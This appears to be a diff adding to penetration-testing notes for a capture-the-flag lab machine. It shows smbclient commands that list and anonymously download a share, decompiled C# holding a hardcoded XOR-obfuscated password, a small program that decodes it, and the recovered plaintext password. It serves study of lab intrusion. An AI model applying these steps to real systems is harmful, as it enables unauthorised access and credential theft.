@@ -33,4 +33,63 @@ Nmap done: 1 IP address (1 host up) scanned in 77.89 seconds
 # url wsman
 http://10.10.11.174:5985/wsman
 
-# dnspy ldapsearch 
+# domain sid
+Domain Sid: S-1-5-21-1677581083-3380853377-188903654
+
+# dnspy ldapsearch
+
+# check list file
+smbclient -L 10.10.11.174
+
+# extract file smb
+smbclient //10.10.11.174/support-tools -N -c 'prompt OFF; recurse ON; lcd  ./smb/;mget *'
+
+#dnspy info :
+
+private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
+private static byte[] key = Encoding.ASCII.GetBytes("armando");
+
+function encrypted password :
+
+namespace UserInfo.Services
+{
+	// Token: 0x02000006 RID: 6
+	internal class Protected
+	{
+		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
+		public static string getPassword()
+		{
+			byte[] array = Convert.FromBase64String(Protected.enc_password);
+			byte[] array2 = array;
+			for (int i = 0; i < array.Length; i++)
+			{
+				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
+			}
+			return Encoding.Default.GetString(array2);
+			}
+		}	
+}
+
+using System;
+using System.Text;
+					
+public class Program
+{      	     
+	public static void Main()
+	{
+		string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
+    	byte[] key = Encoding.ASCII.GetBytes("armando");
+		
+		byte[] numArray = Convert.FromBase64String(enc_password);
+      	byte[] bytes = numArray;
+      for (int index = 0; index < numArray.Length; ++index)
+        bytes[index] = (byte) ((int) numArray[index] ^ (int) key[index % key.Length] ^ 223);
+      Console.WriteLine(Encoding.Default.GetString(bytes));
+	}
+}
+
+# function decrypt :
+
+
+
+# password : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
